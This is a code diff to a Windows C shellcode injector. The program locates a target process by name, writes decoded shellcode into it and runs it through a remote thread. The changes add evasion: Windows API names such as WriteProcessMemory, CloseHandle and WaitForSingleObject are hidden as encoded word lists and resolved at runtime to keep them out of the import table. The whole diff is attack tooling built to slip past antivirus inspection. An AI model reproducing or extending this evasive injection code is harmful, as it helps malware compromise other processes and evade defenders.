@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <Windows.h>
-#include <TlHelp32.h>
+#include <TlHelp32.h> // Including this for PROCESSENTRY32, APIs are dynamically resolved
 
 // Make logging look pretty
 const char* k = "[+]";
@@ -29,7 +29,11 @@ HANDLE (WINAPI * pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPT
 HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD, DWORD);
 BOOL (WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
 BOOL (WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
-HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
+HANDLE (WINAPI * pOpenProcess)(DWORD, BOOL, DWORD);
+BOOL (WINAPI * pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+BOOL (WINAPI * pCloseHandle)(HANDLE);
+DWORD (WINAPI * pWaitForSingleObject)(HANDLE, DWORD);
+int (WINAPI * plstrcmpiA)(LPCSTR, LPCSTR);
 
 // An enum so that the DecodeDict function can know whether to add a null terminator or not
 enum DecodeType
@@ -81,6 +85,10 @@ DWORD FindTarget(const char* processName)
 	unsigned char Process32FirstDec[15];
 	const char* Process32NextEnc[13] = { "wheat", "benefit", "lives", "slide", "remedies", "often", "often", "terry", "dynamic", "exports", "remedies", "fought", "carol" };
 	unsigned char Process32NextDec[14];
+	const char* CloseHandleEnc[11] = { "limit", "delight", "lives", "often", "remedies", "maintain", "logitech", "small", "chart", "delight", "remedies" };
+	unsigned char CloseHandleDec[12];
+	const char* lstrcmpiAEnc[9] = { "delight", "often", "carol", "benefit", "slide", "chorus", "beliefs", "viewed", "logitech" };
+	unsigned char lstrcmpiADec[10];
 
 	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
 	if (hKernel32 == NULL)
@@ -124,6 +132,26 @@ DWORD FindTarget(const char* processName)
 	}
 	printf("%s Decoded API: %s\n", k, Process32NextDec);
 
+	if (!DecodeDict(CloseHandleEnc, sizeof(CloseHandleEnc) / sizeof(CloseHandleEnc[0]), CloseHandleDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode CloseHandle\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, CloseHandleDec);
+
+	if (!DecodeDict(lstrcmpiAEnc, sizeof(lstrcmpiAEnc) / sizeof(lstrcmpiAEnc[0]), lstrcmpiADec, DECODE_STRING))
+	{
+		printf("%s Failed to decode lstrcmpiA\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, lstrcmpiADec);
+
+	pCloseHandle = (BOOL (WINAPI *)(HANDLE)) GetProcAddress(hKernel32, (LPCSTR)CloseHandleDec);
+	if (pCloseHandle == 0)
+	{
+		printf("%s Failed to get address of CloseHandle, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
 	// Get the first process in the snapshot
 	pProcess32First = (BOOL (WINAPI *)(HANDLE, LPPROCESSENTRY32)) GetProcAddress(hKernel32, (LPCSTR)Process32FirstDec);
 	if (pProcess32First == 0)
@@ -132,7 +160,7 @@ DWORD FindTarget(const char* processName)
 		return EXIT_FAILURE;
 	}
 
-	pProcess32Next = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32)) GetProcAddress(hKernel32, (LPCSTR)Process32NextDec);
+	pProcess32Next = (BOOL (WINAPI *)(HANDLE, LPPROCESSENTRY32)) GetProcAddress(hKernel32, (LPCSTR)Process32NextDec);
 	if (pProcess32Next == 0)
 	{
 		printf("%s Failed to get address of Process32Next, error: %ld\n", e, GetLastError());
@@ -141,24 +169,30 @@ DWORD FindTarget(const char* processName)
 
 	if (!pProcess32First(hSnapshot, &pe32))
 	{
-		CloseHandle(hSnapshot);
+		pCloseHandle(hSnapshot);
 		return 0;
 	}
 
+	plstrcmpiA = (int (WINAPI *)(LPCSTR, LPCSTR)) GetProcAddress(hKernel32, (LPCSTR)lstrcmpiADec);
+	if (plstrcmpiA == 0)
+	{
+		printf("%s Failed to get address of lstrcmpiA, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
 	// Check the first process, then continue checking the rest
 	do
 	{
-		if (lstrcmpiA(processName, pe32.szExeFile) == 0)
+		if (plstrcmpiA(processName, pe32.szExeFile) == 0)
 		{
 			DWORD pid = pe32.th32ProcessID;
-			CloseHandle(hSnapshot);
+			pCloseHandle(hSnapshot);
 			return pid;
 		}
 
-	} while (Process32Next(hSnapshot, &pe32));
+	} while (pProcess32Next(hSnapshot, &pe32));
 
 	// Process was not found
-	CloseHandle(hSnapshot);
+	pCloseHandle(hSnapshot);
 
 	return 0;
 }
@@ -175,6 +209,12 @@ static int InjectClassic(void)
 	unsigned char CreateRemoteThreadDec[19];
 	const char* OpenProcessEnc[11] = { "tension", "beliefs", "remedies", "small", "wheat", "benefit", "lives", "slide", "remedies", "often", "often" };
 	unsigned char OpenProcessDec[12];
+	const char* CloseHandleEnc[11] = { "limit", "delight", "lives", "often", "remedies", "maintain", "logitech", "small", "chart", "delight", "remedies" };
+	unsigned char CloseHandleDec[12];
+	const char* WaitForSingleObjectEnc[19] = { "mines", "logitech", "viewed", "carol", "oriented", "lives", "benefit", "helps", "viewed", "small", "binding", "delight", "remedies", "tension", "strange", "lingerie", "remedies", "slide", "carol" };
+	unsigned char WaitForSingleObjectDec[20];
+	const char* WriteProcessMemoryEnc[18] = { "mines", "benefit", "viewed", "carol", "remedies", "wheat", "benefit", "lives", "slide", "remedies", "often", "often", "states", "remedies", "chorus", "lives", "benefit", "writings" };
+	unsigned char WriteProcessMemoryDec[19];
 
 	if (!DecodeDict(sc_enc, sizeof(sc_enc) / sizeof(sc_enc[0]), sc, DECODE_BINARY))
 	{
@@ -251,9 +291,21 @@ static int InjectClassic(void)
 	}
 	printf("%s Successfully allocated %zu bytes with PAGE_READWRITE\n", k, sc_len);
 
+	if (!DecodeDict(WriteProcessMemoryEnc, sizeof(WriteProcessMemoryEnc) / sizeof(WriteProcessMemoryEnc[0]), WriteProcessMemoryDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode WriteProcessMemory\n", e);
+		return EXIT_FAILURE;
+	}
+
+	pWriteProcessMemory = (BOOL(WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(hKernel32, (LPCSTR)WriteProcessMemoryDec);
+	if (!pWriteProcessMemory)
+	{
+		printf("WriteProcessMemory resolve failed\n");
+		return EXIT_FAILURE;
+	}
 
 	printf("%s Writing to buffer to process (%ld)\n", k, PID);
-	if (!WriteProcessMemory(hProcess, Buffer, sc, sc_len, NULL))
+	if (!pWriteProcessMemory(hProcess, Buffer, sc, sc_len, NULL))
 	{
 		printf("%s Failed to write to buffer to process (%lu), error: %ld\n", e, PID, GetLastError());
 		return EXIT_FAILURE;
@@ -292,13 +344,39 @@ static int InjectClassic(void)
 	printf("%s Successfully created remote thread in process (%lu) with TID (%lu)\n", k, PID, TID);
 
 	printf("%s Waiting for remote thread to finish execution\n", k);
-	WaitForSingleObject(hThread, INFINITE);
+	if (!DecodeDict(WaitForSingleObjectEnc, sizeof(WaitForSingleObjectEnc) / sizeof(WaitForSingleObjectEnc[0]), WaitForSingleObjectDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode WaitForSingleObject\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, WaitForSingleObjectDec);
 
+	pWaitForSingleObject = (DWORD (WINAPI *)(HANDLE, DWORD)) GetProcAddress(hKernel32, (LPCSTR)WaitForSingleObjectDec);
+	if (pWaitForSingleObject == 0)
+	{
+		printf("%s Failed to get address of WaitForSingleObject, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
+	pWaitForSingleObject(hThread, INFINITE);
+
+	if (!DecodeDict(CloseHandleEnc, sizeof(CloseHandleEnc) / sizeof(CloseHandleEnc[0]), CloseHandleDec, DECODE_STRING))
+	{
+		printf("%s Failed to decode CloseHandle\n", e);
+		return EXIT_FAILURE;
+	}
+	printf("%s Decoded API: %s\n", k, CloseHandleDec);
+
+	pCloseHandle = (BOOL (WINAPI *)(HANDLE)) GetProcAddress(hKernel32, (LPCSTR)CloseHandleDec);
+	if (pCloseHandle == 0)
+	{
+		printf("%s Failed to get address of CloseHandle, error: %ld\n", e, GetLastError());
+		return EXIT_FAILURE;
+	}
 	printf("%s Remote thread 0x%p finished execution\n", k, hThread);
 	printf("%s Closing handles\n", k);
 
-	CloseHandle(hThread);
-	CloseHandle(hProcess);
+	pCloseHandle(hThread);
+	pCloseHandle(hProcess);
 
 	return EXIT_SUCCESS;
 }
@@ -321,6 +399,7 @@ int main(int argc, char* argv[])
 		return EXIT_FAILURE;
 	}
 	printf("%s Found target PID: %lu\n", k, PID);
+
 
 	return InjectClassic();
 }
